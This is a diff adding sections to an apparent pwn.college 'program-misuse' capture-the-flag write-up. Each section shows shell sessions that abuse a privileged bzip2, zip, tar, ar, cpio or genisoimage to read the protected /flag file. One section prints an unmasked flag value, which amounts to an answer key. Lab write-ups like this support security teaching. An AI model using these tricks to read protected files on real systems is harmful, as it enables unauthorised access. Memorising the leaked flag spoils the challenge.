@@ -249,6 +249,93 @@ pwn.college{xxxxxxxxFLAGxxxxxxxx}
 ```
 
 
+## 18. `bzip2`
 
+Same procedure for the `bzip2` just like `gzip`.
+
+```bash
+hacker@program-misuse~bzip2:/challenge$ bzip2 -c ../flag > /tmp/flag.bz2
+hacker@program-misuse~bzip2:/challenge$ bzip2 -d /tmp/flag.bz2 
+hacker@program-misuse~bzip2:/challenge$ cat /tmp/flag 
+pwn.college{xxxxxxxxFLAGxxxxxxxx}
+```
+
+
+## 19. `zip`
+
+`zip` is just another compression program for files and programs, same as `gzip` and `bzip2`. In `zip` command the **arg1** is the `.zip` file you need to create to store the compressed data and then use `unzip` command to decompress the compressed data to get it back in its original state.
+
+```bash
+hacker@program-misuse~zip:/challenge$ zip /tmp/flag.zip ../flag
+  adding: ../flag (stored 0%)
+hacker@program-misuse~zip:/challenge$ file /tmp/flag.zip
+/tmp/flag.zip: Zip archive data, at least v1.0 to extract, compression method=store
+hacker@program-misuse~zip:/challenge$ cd /tmp/
+hacker@program-misuse~zip:/tmp$ unzip flag.zip
+Archive:  flag.zip
+warning:  skipped "../" path component(s) in ../flag
+ extracting: flag                    
+hacker@program-misuse~zip:/tmp$ cat flag
+pwn.college{xxxxxxxxFLAGxxxxxxxx}
+```
+
+
+## 20. `tar`
+
+`tar` is another program used for archiving files. `tar -cf` is used to compress the file so we need to make our archive file in `.tar` extension and the `-xf` is for decompressing the file. The `-xOf` combined takes decompresses the file and puts in STDOUT and the shell redirects it into a different location where we will not face any permission issues.
+
+```bash
+hacker@program-misuse~tar:/$ tar -cvf flag.tar flag
+flag
+hacker@program-misuse~tar:/$ ls
+bin  boot  challenge  dev  etc  flag  flag.tar  home  lib  lib32  lib64  libx32  media  mnt  nix  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
+hacker@program-misuse~tar:/$ tar -xOf flag.tar > /tmp/flag_copy
+hacker@program-misuse~tar:/$ cat /tmp/flag_copy
+pwn.college{xxxxxxxxFLAGxxxxxxxx}
+```
+
+
+## 21. `ar`
+
+To archive a file we need to use `-r` switch and store that data into a file with `.a` extension.  To extract the file we use `-x` switch.
+
+```bash
+hacker@program-misuse~ar:/challenge$ ar r flag.a ../flag
+ar: creating flag.a
+hacker@program-misuse~ar:/challenge$ ls
+ar  flag.a
+hacker@program-misuse~ar:/challenge$ ar x flag.a
+hacker@program-misuse~ar:/challenge$ ls
+ar  flag  flag.a
+hacker@program-misuse~ar:/challenge$ cat flag
+pwn.college{xxxxxxxxFLAGxxxxxxxx}
+```
+
+
+## 22. `cpio`
+
+`-ov` is to archive the file and verbose output. `-i` is to extract the file and `--to-stdout` is to send the extracted data to standard output. We need to mention the file inside the `.cpio` file we are extracting (here **flag**) so that we can redirect the extracted contents of it to another file (here **flag_contents**).
+
+```bash
+hacker@program-misuse~cpio:/$ echo flag | cpio -ov > /tmp/flag_copy.cpio
+flag
+1 block
+hacker@program-misuse~cpio:/$ cd /tmp
+hacker@program-misuse~cpio:/tmp$ cpio -i --to-stdout flag < flag_copy.cpio > flag_contents
+1 block
+hacker@program-misuse~cpio:/tmp$ cat flag_contents
+pwn.college{xxxxxxxxFLAGxxxxxxxx}
+```
+
+
+## 23. `genisoimage`
+
+`-sort` switch tries to determine the file's **priority** and **path**. The **path** helps `genisoimage` to find the exact location of the file and the **priority** tells where the file should be placed inside the ISO image file. In trying to do this it reads the contents of the file and gives us the flag.
+
+```bash
+hacker@program-misuse~genisoimage:/$ genisoimage -sort /flag
+genisoimage: Incorrect sort file format
+	pwn.college{swAK0GNIsHLZmdC3t3nAQV-hIT1.0VN2EDLzcTO5UzW}
+```
 
 
